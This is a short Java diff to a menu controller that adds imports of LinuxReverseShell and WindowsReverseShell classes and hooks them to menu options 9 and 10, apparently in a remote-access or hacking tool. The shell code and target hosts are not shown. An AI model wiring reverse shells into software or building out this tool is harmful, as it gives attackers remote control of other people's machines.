@@ -1,6 +1,8 @@
 package controller;
 
 import navigation.*;
+import readyForImplementation.LinuxReverseShell;
+import readyForImplementation.WindowsReverseShell;
 
 import java.util.ArrayList;
 import java.util.List;
@@ -78,6 +80,24 @@ public class Controller {
 		if(x == 6)
 		{
 			BenchmarkHashRate();
+		}
+		if(x == 9)
+		{
+			try {
+				WindowsReverseShell.main(null);
+			} catch (Exception e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
+		}
+		if(x == 10)
+		{
+			try {
+				LinuxReverseShell.main(null);
+			} catch (Exception e) {
+				// TODO Auto-generated catch block
+				e.printStackTrace();
+			}
 		}
 		
 	}
